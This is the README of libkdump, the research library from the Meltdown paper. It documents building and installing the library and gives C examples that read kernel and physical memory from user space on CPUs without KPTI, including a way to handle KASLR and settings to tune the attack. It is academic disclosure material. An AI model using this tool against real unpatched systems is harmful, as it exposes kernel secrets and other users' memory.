# libkdump

libkdump is a library to exploit the [Meltdown bug](https://meltdown.help). It allows to easily read kernel memory and physical memory on affected CPUs. 

libkdump was developed for the paper 
 
 * [Meltdown](https://meltdown.help/meltdown.pdf) by Lipp, Schwarz, Gruss, Prescher, Haas, Mangard, Kocher, Genkin, Yarom, and Hamburg
 
 and was used to run several experiments and evaluations. 
 
libkdump supports a wide range of CPUs by automatically adapting most parameters to the current execution environment. 
libkdump was tested on Ubuntu 16.04.3, both with an Intel Core i7-6700K and an Intel Xeon E5-2650 v4, but it should work on every Linux which does not have [KPTI](https://en.wikipedia.org/wiki/Kernel_page-table_isolation) enabled. 

## Build

The library is shipped with a Makefile and can be compiled by running:

```bash
make
```

This produces both a shared library (`libkdump.so`) and a static library (`libkdump.a`).

### Dependenies

libkdump does not have any dependencies. 

## Install

libkdump can be installed system by running
```bash
sudo make install
```
and uninstalled by running
```bash
sudo make uninstall
```


## Usage

This section gives a short overview of how to use libkdump. For a complete documentation, please refer to the source code and the demo applications. 

### Initialization and Cleanup

To use libkdump, include the `libkdump.h` header and initialize libkdump using `libkdump_init`. When done, call `libkdump_cleanup` to revert everything to the way it was before using libkdump. 

#### Example 

```c
#include "libkdump.h"

int main() {
	// initialize libkdump
	if(libkdump_init(libkdump_auto_config) != 0) {
		return -1;
	}

	// use libkdump...
	
	// done, cleanup everything
	if(libkdump_cleanup() != 0) {
		return -1;
	}
	return 0;
}
```

Compile and link with libkdump (static)
```bash
gcc example.c -L. -static -lkdump -pthread
```
or as shared library
```bash
gcc example.c -lkdump
```

### Reading kernel memory

libkdump provides `libkdump_read` as a simple function to read the content of any virtual address. This is independent of whether the virtual address is accessible (user space address) or inaccessible (kernel space address). 

#### Example

```c
size_t addr = 0xfffffffc00022a0ull;
// read the (kernel) address
int value = libkdump_read(addr);
// output result
printf("%c\n", value);
```
### Reading physical memory

To read physical memory, libkdump relies on the direct physical map of Linux which is located at `0xffff 8800 0000 0000` if KASLR is disabled. 

If KASLR is disabled (e.g., due to an older kernel version, or the `nokaslr` kernel command line), reading physical memory is as simple as calling `libkdump_phys_to_virt` on the physical address. The function returns a virtual address for the physical address, which can then be used with `libkdump_read`.

If KASLR is enabled, you have to provide the randomized offset of the direct physical map to libkdump in the initialization (see Example (KASLR)). As the offset does only change with a reboot, it is sufficient to brute-force the offset once (see the kaslr demo or the paper). This takes usually only a few seconds. 

#### Example (no KASLR)
```c
// read memory at physical offset 1GB
size_t phys_addr = 1024 * 1024 * 1024; // 1GB
// convert to virtual address
size_t vaddr = libkdump_phys_to_virt(phys_addr);
// read the virtual address
int value = libkdump_read(vaddr);
// output result
printf("%c\n", value);
```

#### Example (KASLR)
```c
// custom config for libkdump
libkdump_config_t config;
// set sane defaults
config = libkdump_get_autoconfig();
// change address of direct physical map
config.physical_offset = 0xffff98a000000000ull;
// initialize libkdump with custom config
if(libkdump_init(config) != 0) {
	return -1;
}

// read memory at physical offset 1GB
size_t phys_addr = 1024 * 1024 * 1024; // 1GB
// convert to virtual address
size_t vaddr = libkdump_phys_to_virt(phys_addr);
// read the virtual address
int value = libkdump_read(vaddr);
// output result
printf("%c\n", value);
```

### Advanced Configuration

In some cases, the auto configuration of libkdump might not be sufficient (e.g., in the case of KASLR). Thus, libkdump allows to either specify all configuration options manually, or adapt all options after the auto configuration. Furthermore, libkdump also has some compile-time configurations which cannot be changed during runtime. 

#### Runtime configuration

Most options of libkdump can be changed at runtime. All these options are configurable via the `libkdump_config_t` struct that is passed to the `libkdump_init` function. 

The recommended way to change any option is to first get the libkdump auto configuration, and then overwrite specific options.

##### Example

```c
// custom config for libkdump
libkdump_config_t config;
// get auto config from libkdump
config = libkdump_get_autoconfig();
// change any property, e.g., direct-physical map offset
config.physical_offset = 0xffff98a000000000ull;
// initialize libkdump with custom config
if(libkdump_init(config) != 0) {
	return -1;
}
```

##### Options

The following options can be configured:

*  `cache_miss_threshold`: Cache miss threshold in cycles for Flush+Reload. If a memory access is faster than this, it is considered a cache hit, if it is slower, it is considered a cache miss (i.e., a memory access) (default: auto detected).
*  `fault_handling`: How exceptions are handled. Either via fault handling with signal handlers (`SIGNAL_HANDLER`) or via fault suppression using Intel TSX (`TSX`). Note that TSX can only be used if it is supported (default: TSX if available).
*  `measurements`: The number of measurements to perform for one address. Majority vote is used to determine the most likely value afterwards (default: 3). 
*  `accept_after`: How many measurements must read the same character, even if this character won the majority vote (default: 1).
*  `load_threads`: Number of threads which are started to increase the chance of reading from inaccessible addresses (default: 1)
*  `load_type`: The function which is executed by the load threads. One of `NOP` (just an endless loop), `YIELD` (continuously switch between user space and kernel space), or `IO`(continuously issue interrupts by syncing the file system) (default: NOP). 
*  `retries`: Number of Meltdown retries for an address, i.e., how often Meltdown should retry when reading a zero (default: 10000). 
* `physical_offset`: The virtual address of the direct-physical map. If KASLR is not enabled, this is 0xffff880000000000, otherwise it has to be adapted as this cannot be automatically detected (default: 0xffff880000000000).



#### Compile-time configuration

libkdump has some options which cannot be configured at runtime, but have to be configured at compile time. This is done using macros when compiling libkdump (e.g., by adding them in the Makefile). 

##### Options

* `NO_TSX`: Do not compile TSX support (e.g., if the compiler does not support the TSX instructions).
* `FORCE_TSX`: If the auto detection does not work, but the target system has TSX, this compile-time option enforces TSX. However, if TSX is not available, the program will crash. 
* `USE_RDTSCP`: Use `rdtscp` instead of `rdtsc` to measure time. Might be necessary on virtual machines, if `rdtsc` is emulated. However, if `rdtscp` is not available, the program will crash. 
* `MELTDOWN`: The variant of Meltdown to use. One of `meltdown_nonull` (default, as described in the paper), `meltdown` (with an additional NULL pointer access, increases the success probability on some newer CPUs), or `meltdown_fast` (without retry logic, might work better on slower CPUs). 


